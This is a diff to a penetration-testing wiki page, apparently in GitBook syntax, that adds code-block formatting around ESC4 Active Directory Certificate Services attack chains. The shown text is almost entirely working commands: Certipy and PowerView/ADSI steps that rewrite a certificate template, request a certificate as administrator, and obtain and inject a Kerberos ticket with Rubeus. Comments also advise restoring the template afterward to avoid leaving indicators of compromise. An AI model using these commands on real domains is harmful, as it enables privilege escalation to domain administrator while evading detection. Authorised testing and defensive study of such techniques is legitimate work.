@@ -26,6 +26,7 @@ certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
 
 {% tabs %}
 {% tab title="Certipy" %}
+{% code lineNumbers="true" %}
 ```bash
 ## Overwrite the template's configuration to make it ESC1-exploitable (writes a vulnerable template config via LDAP)
 certipy template -u <user>@<domain> -p <password> -dc-ip <DC-IP> -template <target-template> -save-old
@@ -35,24 +36,24 @@ certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
 ## Restore the original template config afterward (Certipy saved it with -save-old) to avoid leaving an obvious IOC
 certipy template -u <user>@<domain> -p <password> -dc-ip <DC-IP> -template <target-template> -configuration <saved-config-file>
 ```
+{% endcode %}
 {% endtab %}
 
 {% tab title="PowerView + Certify + Rubeus" %}
+{% code lineNumbers="true" %}
 ```powershell
 ## 1. Take ownership / grant yourself full control over the template object (PowerView)
 Set-DomainObjectOwner -Identity '<target-template>' -OwnerIdentity '<controlled-user>'
 Add-DomainObjectAcl -TargetIdentity '<target-template>' -PrincipalIdentity '<controlled-user>' -Rights All
-
 ## 2. Flip the template's flags to ESC1-style using the AD PowerShell module / ADSI
 $template = Get-ADObject -Filter {cn -eq '<target-template>'} -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=com'
 Set-ADObject -Identity $template -Replace @{'msPKI-Certificate-Name-Flag' = 1}   # ENROLLEE_SUPPLIES_SUBJECT
-
 ## 3. Request as Administrator (ESC1-style) and convert to pfx
 Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<target-template> /altname:administrator
 openssl.exe pkcs12 -in esc4.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc4.pfx
 Rubeus.exe asktgt /user:administrator /certificate:esc4.pfx /ptt
-
 ## 4. Revert the template's ACL/flags afterward to reduce IOC footprint
 ```
+{% endcode %}
 {% endtab %}
 {% endtabs %}
